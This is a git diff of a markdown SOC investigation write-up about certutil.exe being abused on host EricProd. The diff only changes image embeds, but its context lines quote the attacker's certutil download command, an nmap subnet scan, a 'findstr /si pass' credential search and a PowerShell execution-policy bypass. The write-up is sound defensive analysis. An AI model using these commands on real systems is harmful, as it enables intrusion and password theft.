@@ -6,7 +6,8 @@
 
 A user on EricProd abused the built-in Windows tool `certutil.exe` to download Nmap and a privilege escalation script, then ran a network scan. Terminal history shows a full chain of discovery, privilege escalation enumeration and credential hunting over about 11 hours, so the alert was closed as a true positive.
 
-![01-alert-details](images/soc163-01-alert-details.png)
+<img width="1604" height="328" alt="soc163-01-alert-details" src="https://github.com/user-attachments/assets/b7852d91-1175-4eef-9111-5580a261ecda" />
+
 
 ## The Attack
 
@@ -43,13 +44,14 @@ certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.
 
 The parent process is `cmd.exe`, so the command was typed at an interactive prompt rather than spawned by a document or browser. The binary's MD5 (`f17616ec0522fc5633151f7caa278caa`) belongs to the genuine Microsoft certutil, which is why a hash lookup alone would not flag it.
 
-![02-certutil-parent-process](images/soc163-02-certutil-parent-process.png)
+<img width="1303" height="185" alt="soc163-02-certutil-parent-process" src="https://github.com/user-attachments/assets/d9edfe00-f485-4af8-a23b-8404fbb50499" />
 
 ### 2. Process Analysis
 
 The Processes tab confirms both downloads were used: `nmap.exe` ran with `nmap -sV 192.168.0.0/24 -p 80`, and a second certutil command line fetched the exploit suggester from GitHub. The remaining processes (`explorer.exe`, `outlook.exe`, `winlogon.exe` and others) are normal Windows and VMware software.
 
-![03-processes](images/soc163-03-processes.png)
+<img width="1363" height="584" alt="soc163-03-processes" src="https://github.com/user-attachments/assets/982d6d36-28fa-4ffd-b3a1-ee753847a1ac" />
+
 
 ### 3. Terminal History Analysis
 
@@ -61,9 +63,11 @@ Terminal history shows 17 commands that follow a standard post-exploitation sequ
 - **Credential access (19:32):** `findstr /si pass` searches every text, XML and INI file for stored passwords.
 - **Defense evasion (21:36):** `-exec bypass` disables PowerShell's script execution policy.
 
-![04-terminal-history-1](images/soc163-04-terminal-history-1.png)
+<img width="1396" height="595" alt="soc163-04-terminal-history-1" src="https://github.com/user-attachments/assets/baf130ff-48c9-48de-8fb1-f2d41a48b655" />
 
-![05-terminal-history-2](images/soc163-05-terminal-history-2.png)
+
+<img width="1359" height="572" alt="soc163-05-terminal-history-2" src="https://github.com/user-attachments/assets/de6ded98-d120-4936-9e15-98d226de0dce" />
+
 
 ### 4. Verdict Reasoning
 
